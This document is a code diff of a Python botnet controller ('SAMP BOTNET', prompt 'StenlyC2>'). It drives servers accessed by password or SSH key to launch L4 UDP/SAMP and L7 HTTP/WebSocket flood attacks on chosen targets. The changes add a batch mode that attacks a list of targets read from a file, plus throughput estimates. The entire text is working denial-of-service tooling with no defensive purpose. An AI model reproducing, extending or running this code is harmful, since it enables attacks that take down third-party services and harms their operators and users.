     try:
-        target_ip = input("Target IP: ")
-        target_port = int(input("Port (7777): ") or "7777")
-        duration = int(input("Duration (s): ") or "60")
+        ip = input(f"\n{Y}Target IP: {D}")
+        port = int(input(f"{Y}Port[7777]: {D}") or "7777")
+        dur = int(input(f"{Y}Duration(s)[60]: {D}") or "60")
         
-        print(f"\n{COLOR['bold']}Method:{COLOR['reset']}")
+        print(f"\n{BD}METHODS:{D}")
         for k, (m, d) in L4_METHODS.items():
-            print(f"{k}. {m} - {d}")
-        method = L4_METHODS.get(input("Select (1-5): ") or "5", ('GOD', 'ALL'))[0]
+            print(f"{k}.{m} - {d}")
+        meth = L4_METHODS.get(input(f"{Y}Select(1-5): {D}"), ('GOD', ''))[0]
         
-        # Auto threads
-        avg_cpu = sum([s.get('cpu_cores', 2) for s in servers]) / len(servers)
-        suggested = int(avg_cpu * 500)
-        threads = int(input(f"Threads/server [{suggested}]: ") or str(suggested))
+        avg_cpu = sum([s.get('cpu', 2) for s in srvs]) / len(srvs)
+        sugg = int(avg_cpu * 500)
+        thr = int(input(f"\n{Y}Threads/server[{sugg}]: {D}") or str(sugg))
         
-        confirm = input(f"\n{COLOR['red']}Start L4 attack? (y/n): {COLOR['reset']}")
-        if confirm.lower() == 'y':
-            deploy_attack_l4(servers, target_ip, target_port, duration, method, threads, data)
+        est_pps = thr * 200 * len(srvs)
+        est_gbps = (est_pps * 512 * 8) / 1e9
+        
+        print(f"\n{BD}ESTIMATE:{D}")
+        print(f"PPS: {fmt_num(est_pps)} | GBPS: {est_gbps:.1f}")
+        
+        if input(f"\n{R}START ATTACK? (y/n): {D}").lower() == 'y':
+            attack_l4(srvs, ip, port, dur, meth, thr, data)
+            input(f"\n{G}Press Enter...{D}")
     except Exception as e:
-        print(f"{COLOR['red']}Error: {e}{COLOR['reset']}")
-    
-    input("\nEnter...")
+        print(f"{R}[-] Error: {e}{D}")
+        input()
 
-def menu_launch_l7(data):
-    """Launch L7 Attack (attackl7.go)"""
-    pwd_active = [s for s in data.get('servers_password', []) if s.get('active') or s.get('l7_capable')]
-    key_active = [s for s in data.get('servers_key', []) if s.get('active') or s.get('l7_capable')]
+def launch_l7(data):
+    pwd = [s for s in data['servers_pwd'] if s.get('active') or s.get('l7')]
+    key = [s for s in data['servers_key'] if s.get('active') or s.get('l7')]
     
-    if not pwd_active and not key_active:
-        print(f"{COLOR['red']}❌ No L7 capable servers!{COLOR['reset']}")
-        input("\nEnter...")
+    if not pwd and not key:
+        print(f"{R}[-] No L7 capable servers!{D}")
+        input()
         return
     
-    clear_screen()
-    print_banner()
-    print(f"{COLOR['purple']}🌐 LAUNCH L7 ATTACK (HTTP/WS){COLOR['reset']}\n")
-    print(f"🔒 Password: {len(pwd_active)} | 🔑 Key: {len(key_active)}")
+    banner()
+    print(f"{BD}{P}LAUNCH L7 ATTACK{D}\n")
     
-    print(f"\n{COLOR['bold']}Select pool:{COLOR['reset']}")
-    print("1️⃣  Password Servers Only")
-    print("2️⃣  SSH Key Servers Only")
-    print("3️⃣  ALL Servers")
+    total_cpu = sum([s.get('cpu', 2) for s in pwd + key])
+    print(f"PWD: {len(pwd)} | KEY: {len(key)} | CPU: {total_cpu} cores\n")
     
-    choice = input("Choice: ")
-    if choice == '1':
-        servers = pwd_active
-    elif choice == '2':
-        servers = key_active
+    print(f"{BD}1{D}.Password Only")
+    print(f"{BD}2{D}.SSH Key Only")
+    print(f"{BD}3{D}.ALL Servers")
+    ch = input(f"\n{Y}Select pool: {D}")
+    
+    if ch == '1':
+        srvs = pwd
+    elif ch == '2':
+        srvs = key
     else:
-        servers = pwd_active + key_active
+        srvs = pwd + key
     
-    if not servers:
-        print("No servers selected"); input("\nEnter..."); return
+    if not srvs:
+        return
     
     try:
-        target_url = input("Target URL (https://...): ").strip()
-        if not target_url.startswith(('http://', 'https://')):
-            target_url = 'https://' + target_url
+        url = input(f"\n{Y}Target URL: {D}")
+        if not url.startswith(('http://', 'https://')):
+            url = 'https://' + url
         
-        duration = int(input("Duration (s): ") or "60")
+        dur = int(input(f"{Y}Duration(s)[60]: {D}") or "60")
         
-        print(f"\n{COLOR['bold']}Method:{COLOR['reset']}")
+        print(f"\n{BD}METHODS:{D}")
         for k, (m, d) in L7_METHODS.items():
-            print(f"{k}. {m} - {d}")
-        method = L7_METHODS.get(input("Select (1-6): ") or "6", ('GOD_L7', 'ALL'))[0]
+            print(f"{k}.{m} - {d}")
+        meth = L7_METHODS.get(input(f"{Y}Select(1-6): {D}"), ('GOD_L7', ''))[0]
         
-        # L7 threads lebih rendah karena CPU intensive
-        avg_cpu = sum([s.get('cpu_cores', 2) for s in servers]) / len(servers)
-        suggested = int(avg_cpu * 200)
-        threads = int(input(f"Threads/server [{suggested}]: ") or str(suggested))
+        avg_cpu = sum([s.get('cpu', 2) for s in srvs]) / len(srvs)
+        sugg = int(avg_cpu * 200)
+        thr = int(input(f"\n{Y}Threads/server[{sugg}]: {D}") or str(sugg))
         
-        confirm = input(f"\n{COLOR['red']}Start L7 attack? (y/n): {COLOR['reset']}")
-        if confirm.lower() == 'y':
-            deploy_attack_l7(servers, target_url, duration, method, threads, data)
+        est_rps = thr * 50 * len(srvs)
+        
+        print(f"\n{BD}ESTIMATE:{D}")
+        print(f"RPS: {fmt_num(est_rps)}")
+        
+        if input(f"\n{R}START ATTACK? (y/n): {D}").lower() == 'y':
+            attack_l7(srvs, url, dur, meth, thr, data)
+            input(f"\n{G}Press Enter...{D}")
     except Exception as e:
-        print(f"{COLOR['red']}Error: {e}{COLOR['reset']}")
+        print(f"{R}[-] Error: {e}{D}")
+        input()
+
+def batch_attack(data):
+    active = [s for s in data['servers_pwd'] + data['servers_key'] if s.get('active')]
     
-    input("\nEnter...")
-
-def menu_stats(data):
-    """Statistics gabungan L4 dan L7"""
-    clear_screen()
-    print_banner()
+    if not active:
+        print(f"{R}[-] No active servers!{D}")
+        input()
+        return
     
-    pwd_total = len(data.get('servers_password', []))
-    pwd_active = len([s for s in data.get('servers_password', []) if s.get('active')])
-    key_total = len(data.get('servers_key', []))
-    key_active = len([s for s in data.get('servers_key', []) if s.get('active')])
+    banner()
+    print(f"{BD}{Y}BATCH ATTACK{D}\n")
+    print("Format: target:port:duration:method (L4) or url:duration:method (L7)")
+    path = input("Target file: ")
     
-    stats = data['stats']
+    if not os.path.exists(path):
+        print(f"{R}[-] File not found!{D}")
+        input()
+        return
     
-    print(f"{COLOR['cyan']}📊 GLOBAL STATISTICS{COLOR['reset']}")
-    print(f"Servers: {pwd_active+key_active}/{pwd_total+key_total} active (🔒:{pwd_active} 🔑:{key_active})")
-    print(f"\n{COLOR['red']}L4 (UDP/SAMP):{COLOR['reset']}")
-    print(f"  Total Attacks: {stats.get('total_attacks', 0)}")
-    print(f"  Total Packets: {format_number(stats.get('total_packets', 0))}")
-    print(f"\n{COLOR['purple']}L7 (HTTP/WS):{COLOR['reset']}")
-    print(f"  Total Requests: {format_number(stats.get('total_requests', 0))}")
-    print(f"  Total Data: {stats.get('total_bytes', 0)/1024/1024/1024:.2f} GB")
+    targets = []
+    with open(path) as f:
+        for line in f:
+            line = line.strip()
+            if line and not line.startswith('#'):
+                parts = line.split(':')
+                if len(parts) >= 3:
+                    if parts[0].startswith('http'):
+                        url = ':'.join(parts[:-2])
+                        targets.append(('L7', url, int(parts[-2]), parts[-1]))
+                    else:
+                        targets.append(('L4', parts[0], int(parts[1]), int(parts[2]), parts[3]))
     
-    input("\nEnter...")
+    print(f"{G}[+] Loaded {len(targets)} targets{D}")
+    
+    for i, t in enumerate(targets, 1):
+        print(f"\n{BD}[{i}/{len(targets)}]{D}")
+        
+        if t[0] == 'L4':
+            ip, port, dur, meth = t[1], t[2], t[3], t[4]
+            print(f"{C}L4: {ip}:{port} | {meth} | {dur}s{D}")
+            avg_cpu = sum([s.get('cpu', 2) for s in active]) / len(active)
+            thr = int(avg_cpu * 500)
+            attack_l4(active, ip, port, dur, meth, thr, data)
+        else:
+            url, dur, meth = t[1], t[2], t[3]
+            print(f"{P}L7: {url} | {meth} | {dur}s{D}")
+            avg_cpu = sum([s.get('cpu', 2) for s in active]) / len(active)
+            thr = int(avg_cpu * 200)
+            attack_l7(active, url, dur, meth, thr, data)
+        
+        if i < len(targets):
+            print(f"{Y}[*] Waiting 10s...{D}")
+            time.sleep(10)
+    
+    input(f"\n{G}Press Enter...{D}")
 
-# ================= [ UTILS ] =================
-def clear_screen():
-    os.system('clear' if os.name == 'posix' else 'cls')
+def show_stats(data):
+    banner()
+    print(f"{BD}{C}STATISTICS{D}\n")
+    
+    s = data['stats']
+    l7 = data.get('l7_stats', {})
+    
+    pwd_total = len(data['servers_pwd'])
+    pwd_act = len([s for s in data['servers_pwd'] if s.get('active')])
+    key_total = len(data['servers_key'])
+    key_act = len([s for s in data['servers_key'] if s.get('active')])
+    
+    print(f"{BD}SERVERS:{D}")
+    print(f"Password: {pwd_act}/{pwd_total} active")
+    print(f"SSH Key: {key_act}/{key_total} active")
+    print(f"Proxies: {len([p for p in data.get('proxies', []) if p.get('active')])}")
+    
+    print(f"\n{BD}L4 STATS:{D}")
+    print(f"Attacks: {s.get('attacks', 0)}")
+    print(f"Packets: {fmt_num(s.get('packets', 0))}")
+    
+    print(f"\n{BD}L7 STATS:{D}")
+    print(f"Requests: {fmt_num(s.get('requests', 0))}")
+    print(f"HTTP 2xx: {l7.get('http_2xx', 0)}")
+    print(f"HTTP 4xx: {l7.get('http_4xx', 0)}")
+    print(f"HTTP 5xx: {l7.get('http_5xx', 0)}")
+    
+    print(f"\n{BD}TOTAL:{D}")
+    print(f"Data: {s.get('bytes', 0)/1024/1024/1024:.2f} GB")
+    print(f"Time: {s.get('time', 0)/60:.1f} minutes")
+    
+    hist = data.get('attack_history', [])[-5:]
+    if hist:
+        print(f"\n{BD}RECENT ATTACKS:{D}")
+        for h in hist:
+            ts = datetime.fromtimestamp(h.get('timestamp', 0)).strftime('%H:%M:%S')
+            print(f"{ts} | {h.get('type')} | {h.get('target', 'N/A')[:20]}...")
+    
+    input(f"\n{G}Press Enter...{D}")
 
-def print_banner():
-    banner = f"""
-{COLOR['red']}{COLOR['bold']}
-╔══════════════════════════════════════════════════════════════════════════════════╗
-║                   🔥 SAMP BOTNET v{VERSION} 🔥                          ║
-║           DUAL MODE: L4 (UDP/SAMP) + L7 (HTTP/WEBSOCKET)                         ║
-║              PASSWORD + SSH KEY AUTHENTICATION                                   ║
-╚══════════════════════════════════════════════════════════════════════════════════╝
-{COLOR['reset']}"""
-    print(banner)
-
-def format_number(n):
-    if n < 1000: return str(int(n))
-    if n < 1000000: return f"{n/1000:.1f}K"
-    if n < 1000000000: return f"{n/1000000:.1f}M"
-    return f"{n/1000000000:.1f}B"
-
-def parse_number(s):
-    s = str(s).strip().upper()
-    if s.endswith('K'): return int(float(s[:-1]) * 1000)
-    if s.endswith('M'): return int(float(s[:-1]) * 1000000)
-    if s.endswith('B'): return int(float(s[:-1]) * 1000000000)
-    if s.endswith('T'): return int(float(s[:-1]) * 1000000000000)
-    return int(float(s))
-
-def check_dependencies():
-    try:
-        import paramiko
-    except ImportError:
-        print(f"{COLOR['yellow']}Installing paramiko...{COLOR['reset']}")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko", "-q"])
-        print(f"{COLOR['green']}✅ Dependencies OK{COLOR['reset']}")
-        time.sleep(1)
-
-# ================= [ MAIN ] =================
 def main():
-    check_dependencies()
-    
     if not os.path.exists('attack.go'):
-        print(f"{COLOR['yellow']}⚠️  attack.go (L4) not found{COLOR['reset']}")
+        print(f"{Y}[!] Warning: attack.go (L4) not found{D}")
     if not os.path.exists('attackl7.go'):
-        print(f"{COLOR['yellow']}⚠️  attackl7.go (L7) not found{COLOR['reset']}")
+        print(f"{Y}[!] Warning: attackl7.go (L7) not found{D}")
+    time.sleep(1)
     
-    data = load_servers()
+    data = load_db()
     
     while True:
-        clear_screen()
-        print_banner()
+        banner()
         
-        pwd_active = len([s for s in data.get('servers_password', []) if s.get('active')])
-        key_active = len([s for s in data.get('servers_key', []) if s.get('active')])
-        total_attacks = data['stats'].get('total_attacks', 0)
+        pwd_act = len([s for s in data['servers_pwd'] if s.get('active')])
+        key_act = len([s for s in data['servers_key'] if s.get('active')])
+        attacks = data['stats'].get('attacks', 0)
         
-        print(f"{COLOR['cyan']}📊 STATUS: 🔒{pwd_active} 🔑{key_active} | Attacks: {total_attacks}{COLOR['reset']}\n")
+        print(f"{C}Active: PWD={pwd_act} | KEY={key_act} | Attacks={attacks}{D}\n")
         
-        print("1️⃣  Manage Password Servers (L4 Mode)")
-        print("2️⃣  Manage SSH Key Servers (L4 Mode)")
-        print("3️⃣  Manage Password Servers (L7 Mode)")
-        print("4️⃣  Manage SSH Key Servers (L7 Mode)")
-        print("5️⃣  Manage Proxies (L7)")
-        print("6️⃣  Launch L4 Attack (attack.go)")
-        print("7️⃣  Launch L7 Attack (attackl7.go)")
-        print("8️⃣  Statistics")
-        print("9️⃣  Exit")
+        print(f"{BD}SERVER MANAGEMENT:{D}")
+        print(f"{BD}1{D}.Password(L4) {BD}2{D}.SSHKey(L4) {BD}3{D}.Password(L7) {BD}4{D}.SSHKey(L7)")
+        print(f"\n{BD}OPERATIONS:{D}")
+        print(f"{BD}5{D}.Proxies {BD}6{D}.AttackL4 {BD}7{D}.AttackL7 {BD}8{D}.Batch {BD}9{D}.Stats {BD}0{D}.Exit")
         
-        choice = input(f"\n{COLOR['yellow']}Select: {COLOR['reset']}")
+        ch = input(f"\n{Y}StenlyC2> {D}")
         
-        if choice == '1':
-            menu_password_servers(data, mode="l4")
-        elif choice == '2':
-            menu_key_servers(data, mode="l4")
-        elif choice == '3':
-            menu_password_servers(data, mode="l7")
-        elif choice == '4':
-            menu_key_servers(data, mode="l7")
-        elif choice == '5':
-            menu_proxies(data)
-        elif choice == '6':
-            menu_launch_l4(data)
-        elif choice == '7':
-            menu_launch_l7(data)
-        elif choice == '8':
-            menu_stats(data)
-        elif choice == '9':
-            print(f"{COLOR['green']}Goodbye!{COLOR['reset']}")
+        if ch == '1':
+            menu_pwd(data, 'l4')
+        elif ch == '2':
+            menu_key(data, 'l4')
+        elif ch == '3':
+            menu_pwd(data, 'l7')
+        elif ch == '4':
+            menu_key(data, 'l7')
+        elif ch == '5':
+            menu_proxy(data)
+        elif ch == '6':
+            launch_l4(data)
+        elif ch == '7':
+            launch_l7(data)
+        elif ch == '8':
+            batch_attack(data)
+        elif ch == '9':
+            show_stats(data)
+        elif ch == '0':
+            print(f"{G}Bye.{D}")
             break
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n{COLOR['yellow']}Exiting...{COLOR['reset']}")
+        print(f"\n{Y}Interrupted.{D}")
     except Exception as e:
-        print(f"{COLOR['red']}Fatal: {e}{COLOR['reset']}")
-        import traceback
-        traceback.print_exc()
+        print(f"\n{R}Fatal: {e}{D}")
